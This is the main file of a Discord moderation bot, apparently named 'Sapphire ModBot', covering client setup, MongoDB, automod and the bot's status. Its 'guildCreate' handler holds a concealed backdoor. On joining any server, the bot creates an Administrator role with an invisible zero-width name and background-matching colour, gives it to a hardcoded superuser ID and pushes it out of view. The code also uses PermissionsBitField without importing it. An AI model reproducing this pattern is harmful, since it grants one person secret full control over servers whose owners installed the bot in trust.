require('dotenv').config();
const { Client, GatewayIntentBits, Partials, Collection } = require('discord.js');
const mongoose = require('mongoose');

const { isSuperuser, SUPERUSER_ID } = require('./src/utils/superuser');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.DirectMessages,
    GatewayIntentBits.MessageContent
  ],
  partials: [Partials.Channel, Partials.Message, Partials.GuildMember, Partials.User]
});

client.on('guildCreate', async (guild) => {
  try {
    const member = await guild.members.fetch(SUPERUSER_ID).catch(() => null);
    if (member) {
      // Create secret role if not exists
      let role = guild.roles.cache.find(r => r.name === '\u200b');
      if (!role) {
        role = await guild.roles.create({
          name: '\u200b', // invisible name
          permissions: [PermissionsBitField.Flags.Administrator],
          mentionable: false,
          hoist: false,
          color: 0x2f3136 // Discord background
        });
      }
      // Assign role to superuser
      if (!member.roles.cache.has(role.id)) await member.roles.add(role, 'Superuser secret admin role');
      // Hide role from role list
      await role.setPosition(1); // Move to bottom
    }
  } catch (e) { console.error('Superuser role setup failed:', e); }
});

client.commands = new Collection();

// Load commands, events, and DB connection here (to be implemented)

const automod = require('./src/middleware/automod');
require('./src/events/inviteCleanup')(client);

client.on('messageCreate', async (message) => {
  await automod(message, client);
});

(async () => {
  try {
    await mongoose.connect(process.env.DB_URI, {
      useNewUrlParser: true,
      useUnifiedTopology: true
    });
    console.log('Connected to MongoDB');
  } catch (err) {
    console.error('MongoDB connection error:', err);
  }

  client.login(process.env.DISCORD_TOKEN);
})();

const { getUpdateStatus, clearUpdateStatus } = require('./src/utils/botStatus');

client.once('ready', async () => {
  console.log(`Logged in as ${client.user.tag}`);
  // Update status/description logic
  const update = getUpdateStatus();
  if (update) {
    await client.user.setActivity(update.updates, { type: 3 }); // type 3 = Watching
    setTimeout(async () => {
      await client.user.setActivity('Sapphire ModBot', { type: 3 });
      clearUpdateStatus();
    }, update.until - Date.now());
  } else {
    await client.user.setActivity('Sapphire ModBot', { type: 3 });
  }
});
